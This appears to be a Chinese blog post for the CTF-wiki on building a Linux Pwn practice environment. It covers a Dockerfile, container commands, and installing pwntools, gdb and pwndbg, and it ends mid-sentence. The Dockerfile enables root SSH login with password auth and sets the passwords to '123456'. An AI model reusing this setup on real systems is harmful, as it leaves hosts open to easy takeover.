    <updated>2024-05-14T17:08:45.995Z</updated>
    
    <content type="html"><![CDATA[<p>信 Docker ，得永生</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00.一切开始之前"></a>0x00.一切开始之前</h1><p><a href="https://ctf-wiki.org/pwn/linux/user-mode/environment/">CTF-wiki</a> 上 Linux 用户态 Pwn 环境搭建的部分 Wiki 组咕了好久了， <em>作为 Pwn 模块默认的第一个页面，一直空着总归不是那么地雅观</em> ，因此作为 Wiki 组为数不多的活人（虽然也只是半个活死人罢了， <del>问就是 Wiki 组包括笔者在内的全员都在和牢大打复活赛</del> ），笔者决定还是找个时间给这一块补充上</p><p>虽然笔者已经很久很久很久没有正经做过用户态 Pwn 了，不过如果只是基础的常规题型的话，需要的工具其实基本上是万年不变的，因此笔者找了个时间（ <del>其实就是在实验室偷偷摸鱼</del> ）给这块内容稍微补充了一下，顺便水一篇博客这样子（ <del>因为太忙 + 太懒实在是没写东西，简单混点更新</del> ）</p><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>现有的 CTF Pwn 题主要以 Linux 下的用户态 Pwn 为主，因此我们通常需要在本地拥有一个 Linux 运行环境，这通常可以通过安装 Linux 虚拟机来完成，此外你也可以在物理机上安装 Linux 操作系统。</p><p>绝大多数 Linux Pwn 题目的远程环境以 <a href="https://ubuntu.com/">Ubuntu</a> 为主，因此为了方便在本地调试题目，你通常需要搭建一个与题目版本相匹配的 Ubuntu 运行环境，不过 <em>这并不意味着你必须要使用 Ubuntu 作为你的主力操作系统</em> 。你仍旧可以选择继续使用你喜欢的其他 Linux 发行版（如，Arch、Debian、openSUSE、Fedora、NixOS 等），并使用 Docker 来搭建相应的 Ubuntu 做题环境。</p><p>传统 CTF Pwn 题目通常仅需要以下工具便能完成解题：</p><ul><li>IDA：用于对题目进行逆向分析。</li><li>Python + pwntools：用于编写漏洞利用脚本。</li><li>gdb + pwndbg&#x2F;peda：用于调试题目二进制文件。</li></ul><p>需要注意的是，在初学阶段我们并不推荐任何基于 pwntools 进行过度二次包装的软件包，也不推荐你在利用脚本中使用 lambda 语句进行过度简化，我们更推荐你在学习到一定程度后再去根据个人使用习惯进行决定。</p><p>此外，部分题目可能需要一些额外的环境（例如 kernel pwn 需要 qemu），我们将在后续介绍到对应题目时单独进行介绍。</p><h1 id="0x01-使用-Docker-搭建-CTF-Pwn-做题环境（推荐）"><a href="#0x01-使用-Docker-搭建-CTF-Pwn-做题环境（推荐）" class="headerlink" title="0x01. 使用 Docker 搭建 CTF Pwn 做题环境（推荐）"></a>0x01. 使用 Docker 搭建 CTF Pwn 做题环境（推荐）</h1><p>为了保证利用脚本能够正常打通，我们通常需要在本地准备相同的运行环境，并在进行远程利用之前先在本地进行测试，但由于 CTF 题目远程环境众多，若是为每个不同的环境都单独准备一个 Ubuntu 虚拟机，则不仅要在每个虚拟机上都完整搭建一遍调试环境，且会占用大量磁盘空间，同时也无法保证本地环境小版本和远程环境一定相同——除非每个小版本都单独创建一个虚拟机并永不升级，这种解决方案并不优雅。</p><p>通过 <code>LD_PRELOAD</code> 参数在程序执行前 预先加载 libc 在某些程度上是一个可行的解决方案，在 libc 大版本相同的情况下载入不同的小版本通常并不会出现问题，但是由于不同系统环境中 ld 版本不同的缘故，对于跨 ld 版本加载不同版本的 libc 则可能出现 segmentation fault，从而导致无法正常运行与调试题目。</p><p>虽然 Linux 的用户环境并不似 Windows 那样有着强壮的二进制前向兼容性，但是用户环境依托于内核环境、依托于内核向用户态暴露的接口——系统调用，而这并不是会轻易发生变动以及兼容性破坏的一个东西，由此，通过重新开辟一个对应的新的用户环境的方式—— 即形如 Docker 这样的操作系统层上的虚拟化方案，我们便能非常简单地搭建不同的 Pwn 题所对应的原始环境。</p><h2 id="Docker-环境搭建"><a href="#Docker-环境搭建" class="headerlink" title="Docker 环境搭建"></a>Docker 环境搭建</h2><p>Docker 的安装请大家根据自己所使用的 Linux 发行版自行参照 <a href="https://docs.docker.com/engine/install/">Docker 官网</a> 或是发行版自己的 Wiki 进行配置，这里不再赘叙。</p><h2 id="创建-Docker-镜像"><a href="#创建-Docker-镜像" class="headerlink" title="创建 Docker 镜像"></a>创建 Docker 镜像</h2><p>我们以以下 Dockerfile 所创建的镜像作为模板，大家可以根据自己的需求自行修改：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span> ubuntu:<span class="hljs-number">22.04</span><br><br><span class="hljs-keyword">ARG</span> DEBIAN_FRONTEND=noninteractive<br><br><span class="hljs-comment"># pre-install softwares</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> sed -i <span class="hljs-string">&quot;s/http:\/\/archive.ubuntu.com/http:\/\/mirrors.tuna.tsinghua.edu.cn/g&quot;</span> /etc/apt/sources.list &amp;&amp; \</span><br><span class="language-bash">    apt-get -y update &amp;&amp; \</span><br><span class="language-bash">    apt-get install -y lib32z1 apt-transport-https python3 python3-pip git \</span><br><span class="language-bash">    libglib2.0-dev libfdt-dev libpixman-1-dev zlib1g-dev \</span><br><span class="language-bash">    vim nano netcat openssh-server unzip make wget bison flex build-essential \</span><br><span class="language-bash">    curl qemu qemu-system-x86 gcc gdb clang lldb tmux konsole</span><br><br><span class="hljs-comment"># enable ssh login</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">rm</span> -f /etc/service/sshd/down</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> sed -ri <span class="hljs-string">&#x27;s/^#?PermitRootLogin\s+.*/PermitRootLogin yes/&#x27;</span> /etc/ssh/sshd_config &amp;&amp;\</span><br><span class="language-bash">    sed -ri <span class="hljs-string">&#x27;s/#UseDNS\ no/UseDNS\ no/g&#x27;</span> /etc/ssh/sshd_config &amp;&amp; \</span><br><span class="language-bash">    sed -ri <span class="hljs-string">&quot;s/StrictModes yes/StrictModes no/g&quot;</span> /etc/ssh/sshd_config &amp;&amp; \</span><br><span class="language-bash">    sed -ri <span class="hljs-string">&quot;s/UsePAM yes/UsePAM no/g&quot;</span> /etc/ssh/sshd_config</span><br><br><span class="hljs-comment"># enable login with password</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;PasswordAuthentication yes&#x27;</span> &gt;&gt; /etc/ssh/sshd_config</span><br><br><span class="hljs-comment"># set username and password</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> groupadd arttnba3 &amp;&amp; \</span><br><span class="language-bash">    useradd -g arttnba3 arttnba3 -m -s /bin/bash &amp;&amp; \</span><br><span class="language-bash">    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;arttnba3:123456&quot;</span> | chpasswd &amp;&amp; \</span><br><span class="language-bash">    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;root:123456&quot;</span> | chpasswd</span><br><br><span class="hljs-comment"># enable ssh key login</span><br><span class="hljs-comment">#RUN mkdir /home/arttnba3/.ssh &amp;&amp; \</span><br><span class="hljs-comment">#    echo &quot;Your ssh key&quot; &gt; /home/arttnba3/.ssh/authorized_keys</span><br><br><span class="hljs-comment"># keep container running</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;#!/bin/sh\nservice ssh restart\nsleep infinity&quot;</span> &gt; /root/start.sh</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">chmod</span> +x /root/start.sh</span><br><br><span class="hljs-comment"># enable sudo</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> apt-get install -y sudo &amp;&amp; \</span><br><span class="language-bash">       usermod -aG sudo arttnba3</span><br><br><span class="hljs-comment"># pwn-related tools</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> python3 -m pip config <span class="hljs-built_in">set</span> global.index-url http://pypi.tuna.tsinghua.edu.cn/simple &amp;&amp; \</span><br><span class="language-bash">    python3 -m pip config <span class="hljs-built_in">set</span> global.trusted-host pypi.tuna.tsinghua.edu.cn &amp;&amp; \</span><br><span class="language-bash">    python3 -m pip install -U pip &amp;&amp; \</span><br><span class="language-bash">    python3 -m pip install --no-cache-dir \</span><br><span class="language-bash">    pwntools \</span><br><span class="language-bash">    ropgadget \</span><br><span class="language-bash">    z3-solver \</span><br><span class="language-bash">    smmap2 \</span><br><span class="language-bash">    apscheduler \</span><br><span class="language-bash">    ropper \</span><br><span class="language-bash">    unicorn \</span><br><span class="language-bash">    keystone-engine \</span><br><span class="language-bash">    capstone \</span><br><span class="language-bash">    angr \</span><br><span class="language-bash">    pebble \</span><br><span class="language-bash">    r2pipe \</span><br><span class="language-bash">    LibcSearcher</span><br><br><span class="hljs-keyword">RUN</span><span class="language-bash"> git <span class="hljs-built_in">clone</span> https://github.com/pwndbg/pwndbg &amp;&amp; \</span><br><span class="language-bash">    <span class="hljs-built_in">cd</span> pwndbg &amp;&amp; <span class="hljs-built_in">chmod</span> +x setup.sh &amp;&amp; ./setup.sh</span><br><br><span class="hljs-keyword">CMD</span><span class="language-bash"> [<span class="hljs-string">&quot;/root/start.sh&quot;</span>]</span><br><br><span class="hljs-keyword">EXPOSE</span> <span class="hljs-number">22</span><br></code></pre></td></tr></table></figure><p>在一个空白文件夹中创建一个名为 <code>Dockerfile</code> 的文件，并写入上述内容，随后运行如下指令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker build -t pwnenv_ubuntu22 .</span><br></code></pre></td></tr></table></figure><p>完成之后你便拥有了一个名为 <code>pwnenv_ubuntu22</code> 的带有做题环境的 Ubuntu22 镜像，可以通过 <code>docker images</code> 指令查看：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker images</span>                                              <br>REPOSITORY               TAG         IMAGE ID       CREATED          SIZE                                     <br>pwnenv_ubuntu22          latest      c129ca086a72   15 seconds ago   2.81GB<br></code></pre></td></tr></table></figure><p>你也可以根据需求修改第一行的基镜像，从而创建基于不同 Ubuntu 发行版的 docker 镜像。</p><h2 id="从-Docker-镜像创建容器"><a href="#从-Docker-镜像创建容器" class="headerlink" title="从 Docker 镜像创建容器"></a>从 Docker 镜像创建容器</h2><p>我们只需要运行如下命令便能基于我们刚刚创建的 Docker 镜像创建一个新的容器，方便起见你可以将其创建为一个脚本，各参数说明如下：</p><ul><li><code>-d</code>： 使容器在后台运行</li><li><code>-p 25000:2222</code>： 容器的 <code>22</code> 端口映射到本地的 <code>25000</code> 端口</li><li><code>--name=pwn22</code>： 容器名为 <code>pwn22</code></li><li><code>-v ~/Desktop/CTF:/CTF</code> ： 将本地的 <code>~/Desktop/CTF</code> 目录映射到容器中的 <code>/CTF</code> 目录，这样我们便能在容器内访问到本地文件，而无需将文件重复拷贝进容器中</li><li><code>pwnenv_ubuntu22</code>：创建容器所使用的镜像</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker run \</span><br><span class="language-bash">    -d \</span><br><span class="language-bash">    -p 25000:22 \</span><br><span class="language-bash">    --name=pwn22 \</span><br><span class="language-bash">    -v ~/Desktop/CTF:/CTF \</span><br><span class="language-bash">    pwnenv_ubuntu22</span><br></code></pre></td></tr></table></figure><p>之后通过如下命令便能进入到容器当中：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker <span class="hljs-built_in">exec</span> -w /CTF -e TERM=xterm-256color -it pwn22 bash</span><br></code></pre></td></tr></table></figure><p>如果你不想将本地目录与容器进行共享，而是想要将所需文件拷贝一份到容器中，则可以使用 docker cp 命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker <span class="hljs-built_in">cp</span> 本地源文件路径 容器名:容器内目的路径</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker <span class="hljs-built_in">cp</span> 容器名:容器内源文件路径 本地目的路径</span><br></code></pre></td></tr></table></figure><p>由于我们为容器设置了 ssh 服务，我们也可以通过 ssh 连接入容器环境，这允许我们使用 vscode 等工具连接到容器内部：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">ssh root@localhost -p 25000</span><br></code></pre></td></tr></table></figure><p>若是容器环境被我们折腾坏了，则可以直接通过 <code>docker rm 容器名</code> 进行删除，之后再重新使用 <code>docker run</code> 创建新容器即可，需要注意的是这种方式会将新拷贝进容器的文件给删除（但不会删除挂载目录）。</p><h2 id="将-Docker-容器接入本地图形界面"><a href="#将-Docker-容器接入本地图形界面" class="headerlink" title="将 Docker 容器接入本地图形界面"></a>将 Docker 容器接入本地图形界面</h2><p>pwntools 自带的调试命令 <code>gdb.attach()</code> 需要创建新的窗口，而在容器中直接运行会失败，因此我们需要为容器接入本地的图形服务，以达成原生的运行效果（直接弹出一个新的窗口）。</p><blockquote><p>若是觉得这种办法比较麻烦，也可以选择使用 tmux 配置多窗口，只需在运行 <code>gdb.attach()</code> 命令前运行 <code>context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]</code> 即可。</p></blockquote><h3 id="For-Wayland"><a href="#For-Wayland" class="headerlink" title="For Wayland"></a>For Wayland</h3><p>对于 Wayland 环境，在创建容器时我们需要额外附加一些参数：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker run \</span><br><span class="language-bash">    -d \</span><br><span class="language-bash">    -p <span class="hljs-string">&quot;25000:22&quot;</span> \</span><br><span class="language-bash">    --name=pwn22 \</span><br><span class="language-bash">    -v ~/Desktop/CTF:/CTF \</span><br><span class="language-bash">    -e XDG_RUNTIME_DIR=/tmp \</span><br><span class="language-bash">    -e DISPLAY=<span class="hljs-variable">$DISPLAY</span> \</span><br><span class="language-bash">    -e WAYLAND_DISPLAY=<span class="hljs-variable">$WAYLAND_DISPLAY</span> \</span><br><span class="language-bash">    -v <span class="hljs-variable">$XDG_RUNTIME_DIR</span>/<span class="hljs-variable">$WAYLAND_DISPLAY</span>:/tmp/<span class="hljs-variable">$WAYLAND_DISPLAY</span> \</span><br><span class="language-bash">    -e QT_QPA_PLATFORM=wayland \</span><br><span class="language-bash">    pwnenv_ubuntu22</span><br></code></pre></td></tr></table></figure><p>之后在运行 <code>gdb.attach()</code> 之前运行如下 python 语句之一进行配置即可，请根据自己所使用的桌面环境进行选择。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">context.terminal = [<span class="hljs-string">&#x27;konsole&#x27;</span>, <span class="hljs-string">&#x27;-e&#x27;</span>, <span class="hljs-string">&#x27;sh&#x27;</span>, <span class="hljs-string">&#x27;-c&#x27;</span>] <span class="hljs-comment"># for KDE</span><br>context.terminal = [<span class="hljs-string">&#x27;gnome-terminal&#x27;</span>, <span class="hljs-string">&#x27;-e&#x27;</span>, <span class="hljs-string">&#x27;sh&#x27;</span>, <span class="hljs-string">&#x27;-c&#x27;</span>] <span class="hljs-comment"># for Gnome</span><br></code></pre></td></tr></table></figure><h3 id="For-X11"><a href="#For-X11" class="headerlink" title="For X11"></a>For X11</h3><p>对于使用 X11 图形服务的，在创建容器时我们则需要附加如下参数：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker run \</span><br><span class="language-bash">    -d \</span><br><span class="language-bash">    -p <span class="hljs-string">&quot;25000:22&quot;</span> \</span><br><span class="language-bash">    --name=pwn22 \</span><br><span class="language-bash">    -v ~/Desktop/CTF:/CTF \</span><br><span class="language-bash">    -v /tmp/.X11-unix:/tmp/.X11-unix \</span><br><span class="language-bash">    -e DISPLAY=<span class="hljs-variable">$DISPLAY</span> \</span><br><span class="language-bash">    pwnenv_ubuntu22</span><br></code></pre></td></tr></table></figure><p>之后在运行 <code>gdb.attach()</code> 之前运行如下 python 语句之一进行配置即可，请根据自己所使用的桌面环境进行选择。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">context.terminal = [<span class="hljs-string">&#x27;konsole&#x27;</span>, <span class="hljs-string">&#x27;-e&#x27;</span>, <span class="hljs-string">&#x27;sh&#x27;</span>, <span class="hljs-string">&#x27;-c&#x27;</span>] <span class="hljs-comment"># for KDE</span><br>context.terminal = [<span class="hljs-string">&#x27;gnome-terminal&#x27;</span>, <span class="hljs-string">&#x27;-e&#x27;</span>, <span class="hljs-string">&#x27;sh&#x27;</span>, <span class="hljs-string">&#x27;-c&#x27;</span>] <span class="hljs-comment"># for Gnome</span><br></code></pre></td></tr></table></figure><blockquote><p>参考 <a href="https://gist.github.com/turekt/71f6950bc9f048daaeb69479845b672b">Running pwnlib gdb (pwntools) feature inside Docker</a> 。</p></blockquote><h1 id="0x02-在本地直接搭建-CTF-Pwn-做题环境"><a href="#0x02-在本地直接搭建-CTF-Pwn-做题环境" class="headerlink" title="0x02. 在本地直接搭建 CTF Pwn 做题环境"></a>0x02. 在本地直接搭建 CTF Pwn 做题环境</h1><p>除了使用 Docker 之外，你也可以直接在本地搭建做题环境，对于常规的 Linux 用户态 pwn 题目，我们通常仅需要如下软件：</p><ul><li>IDA：用于对题目进行逆向分析。</li><li>Python + pwntools：用于编写漏洞利用脚本。</li><li>gdb + pwndbg&#x2F;peda：用于调试题目二进制文件。</li></ul><h2 id="获取-IDA"><a href="#获取-IDA" class="headerlink" title="获取 IDA"></a>获取 IDA</h2><p>IDA Pro（interactive Disassembler Professional）是由 Hex-Rays 公司出品的一款交互式反汇编工具，也是软件逆向工程当中最流行的一个静态分析工具。通过 IDA Pro 我们可以很方便地复原二进制程序的运行逻辑，从而进一步审计出其中存在的漏洞。</p><p><a href="https://hex-rays.com/ida-pro/">IDA Pro</a> 为付费软件，软件本体与不同架构的反编译引擎单独进行收费，你可以根据自己的需求在 Hex-rays 的官网自行购买相应的软件许可证以进行使用。</p><blockquote><p>截至 2024 年 4 月， IDA Pro 本体许可证的价格为 1975 USD，任一指令集架构反编译功能的许可证价格为 2765 USD。</p></blockquote><p>此外，Hex-rays 公司还提供基于云引擎的免费逆向工具 <a href="https://hex-rays.com/ida-free/">IDA Free</a>，目前仅支持 x86 逆向，不过对于绝大部分 CTF 中 Linux 下的用户态 Pwn 题目而言通常已足够使用。</p><h2 id="安装-Python"><a href="#安装-Python" class="headerlink" title="安装 Python"></a>安装 Python</h2><p>绝大部分 Linux 发行版目前已经自带 Python 运行环境，因此通常我们并不需要手动安装 Python。。若你的计算机上不存在 Python 运行环境，则可以根据自己所使用的发行版手动使用包管理器进行安装。</p><p>需要注意的是，部分 Linux 发行版中 Python 版本默认为 Python2，因此你可能需要手动指定安装 Python3。</p><h2 id="配置-venv-python-环境（可选）"><a href="#配置-venv-python-环境（可选）" class="headerlink" title="配置 venv python 环境（可选）"></a>配置 venv python 环境（可选）</h2><p>在部分 Linux 发行版上（如 <code>openSUSE Tumbleweed</code> ）使用 <code>pip</code> 命令时，你可能会遇到如下报错，这是由于发行版自身安全策略限制的缘故：</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">error: externally-managed-environment<br><br>× This environment is externally managed<br>╰─&gt; To install Python packages <span class="hljs-keyword">system</span>-wide, <span class="hljs-keyword">try</span><br>    zypper install python311-xyz, where xyz is <span class="hljs-keyword">the</span> package<br>    you are trying <span class="hljs-built_in">to</span> install.<br>    <br>    If you wish <span class="hljs-built_in">to</span> install <span class="hljs-keyword">a</span> non-rpm packaged Python package,<br>    <span class="hljs-built_in">create</span> <span class="hljs-keyword">a</span> virtual environment <span class="hljs-keyword">using</span> python3<span class="hljs-number">.11</span> -m venv path/<span class="hljs-built_in">to</span>/venv.<br>    Then use path/<span class="hljs-built_in">to</span>/venv/bin/python <span class="hljs-keyword">and</span> path/<span class="hljs-built_in">to</span>/venv/bin/pip.<br>    <br>    If you wish <span class="hljs-built_in">to</span> install <span class="hljs-keyword">a</span> non-rpm packaged Python application,<br>    <span class="hljs-keyword">it</span> may be easiest <span class="hljs-built_in">to</span> use `pipx install xyz`, which will manage <span class="hljs-keyword">a</span><br>    virtual environment <span class="hljs-keyword">for</span> you. Install pipx via `zypper install python311-pipx` .<br><br>note: If you believe this is <span class="hljs-keyword">a</span> mistake, please contact your Python installation <span class="hljs-keyword">or</span> OS distribution provider. You can override this, <span class="hljs-keyword">at</span> <span class="hljs-keyword">the</span> risk <span class="hljs-keyword">of</span> breaking your Python installation <span class="hljs-keyword">or</span> OS, <span class="hljs-keyword">by</span> passing <span class="hljs-comment">--break-system-packages.</span><br></code></pre></td></tr></table></figure><p>对于这种情况，我们可以选择使用 <a href="https://docs.python.org/zh-cn/3/library/venv.html#module-venv">venv</a> 模块创建“虚拟环境”。虚拟环境在默认情况下与其他虚拟环境中的软件以及操作系统中安装的 Python 解释器和库保持隔离，这确保了软件包安装的安全性，且使得我们能够简单地删除并从头开始重建环境。</p><p>我们可以通过如下命令创建一个新的虚拟环境（若路径不存在，则将被创建）：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">python3 -m venv 自定义的venv文件夹路径<br></code></pre></td></tr></table></figure><p>完成创建之后，我们便可以通过 <code>source</code> 命令进入到 venv 中，请根据你所使用的 shell 进行选择其中之一：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">source 自定义的venv文件夹路径/bin/activate         # for bash<br>source 自定义的venv文件夹路径/bin/activate.fish     # for fish<br>source 自定义的venv文件夹路径/bin/activate.csh     # for csh/tcsh<br></code></pre></td></tr></table></figure><blockquote><p>你也可以选择将这条命令加入到 <code>~/.bashrc</code> 文件中，从而在打开 shell 时默认执行。</p></blockquote><p>由于虚拟环境具有轻量、安全、可重构建的特性，因此即便是在你的计算机上并不存在安全策略限制，我们也更推荐你为 CTF&#x2F;Pwn 创建一个单独的 Python 虚拟环境。</p><h2 id="安装-pwntools"><a href="#安装-pwntools" class="headerlink" title="安装 pwntools"></a>安装 pwntools</h2><p><a href="https://docs.pwntools.com/en/stable/">pwntools</a> 是一个强大的 Python 软件包，其为我们提供了基本的 pwn 脚本编写环境，以及各类方便的利用工具，在安装好 Python 以及 pip 之后你可以很方便地使用如下指令进行安装：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">python3 -m pip install --upgrade pip<br>python3 -m pip install --upgrade pwntools<br></code></pre></td></tr></table></figure><p>之后在 Python 中便能很方便地通过 <code>from pwn import *</code> 指令使用该包中的各类工具，你也可以使用 <code>from pwn import 名字</code> 来仅导入所需的特定工具，或是使用 <code>import pwn</code> 导入包名后通过 <code>pwn.名字</code> 来使用对应的工具。</p><h2 id="安装-gdb"><a href="#安装-gdb" class="headerlink" title="安装 gdb"></a>安装 gdb</h2><p>GNU Debugger（GDB）是 GNU 项目开发的软件调试器，使用 gdb 我们可以很方便地对二进制程序进行动态调试。</p><p>gdb 在绝大部分 Linux 发行版上都已默认安装，你可以在 shell 中输入 <code>gdb</code> 命令进行确认（输入 <code>q</code> 退出）:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">gdb</span><br>GNU gdb (GDB; SUSE Linux Enterprise 15) 13.2<br>Copyright (C) 2023 Free Software Foundation, Inc.<br>License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;<br>This is free software: you are free to change and redistribute it.<br>There is NO WARRANTY, to the extent permitted by law.<br>Type &quot;show copying&quot; and &quot;show warranty&quot; for details.<br>This GDB was configured as &quot;x86_64-suse-linux&quot;.<br>Type &quot;show configuration&quot; for configuration details.<br>For bug reporting instructions, please see:<br>&lt;http://bugs.opensuse.org/&gt;.<br>Find the GDB manual and other documentation resources online at:<br>    &lt;http://www.gnu.org/software/gdb/documentation/&gt;.<br><br>For help, type &quot;help&quot;.<br>Type &quot;apropos word&quot; to search for commands related to &quot;word&quot;.<br>(gdb) <br></code></pre></td></tr></table></figure><p>若你的计算机尚未安装 gdb，则可以使用如下命令进行安装，请自行分辨你所使用的发行版。</p><p>Debian &#x2F; Ubuntu:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo apt-get install -y gdb<br></code></pre></td></tr></table></figure><p>openSUSE Leap &#x2F; Tumbleweed &#x2F; SLE:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo zypper install gdb<br></code></pre></td></tr></table></figure><p>Arch Linux &#x2F; Manjaro &#x2F; EndeavourOS:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo yay -S gdb # 若未配置 AUR，你也可以使用 pacman -S gdb 进行安装<br></code></pre></td></tr></table></figure><p>Fedora &#x2F; CentOS &#x2F; RHEL:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo yum install gdb # 事实上，yum 被软链接到 dnf<br></code></pre></td></tr></table></figure><h2 id="安装-pwndbg"><a href="#安装-pwndbg" class="headerlink" title="安装 pwndbg"></a>安装 pwndbg</h2><p><a href="https://github.com/pwndbg/pwndbg">pwndbg</a> (&#x2F;paʊnˈdiˌbʌɡ&#x2F;) 是一个强大的 GDB 插件，通过该插件我们可以在调试时很方便地查看运行环境以及获取堆内存布局等信息。</p><p>pwndbg 项目自带了安装脚本，因此我们可以很方便地从源码进行安装：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">git clone https://github.com/pwndbg/pwndbg<br>cd pwndbg<br>./setup.sh<br></code></pre></td></tr></table></figure><p>对于使用 nix 包管理器的发行版（如 